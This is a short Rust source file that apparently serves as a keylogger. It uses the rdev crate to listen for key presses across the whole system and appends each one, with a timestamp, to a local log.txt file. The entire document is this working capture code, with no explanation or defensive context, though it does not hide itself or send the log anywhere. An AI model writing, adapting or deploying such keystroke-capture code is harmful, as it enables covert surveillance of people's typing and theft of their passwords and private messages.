use rdev::{listen, Event};
use std::fs::OpenOptions;
use std::io::prelude::*;
use std::time::SystemTime;

fn main() {
    if let Err(error) = listen(callback) {
        println!("Error: {:?}", error)
    }
}

fn callback(event: Event) {
    let mut file = OpenOptions::new()
    .append(true)
    .create(true)
    .open("log.txt")
    .expect("Unable to open log.txt");

    if let Some(key) = event.name {
        let now = SystemTime::now();
        let entry = format!("{:?} - key pressed is: {}\n", now, key);
        file.write_all(entry.as_bytes()).expect("Failed to write to file");
    }
}
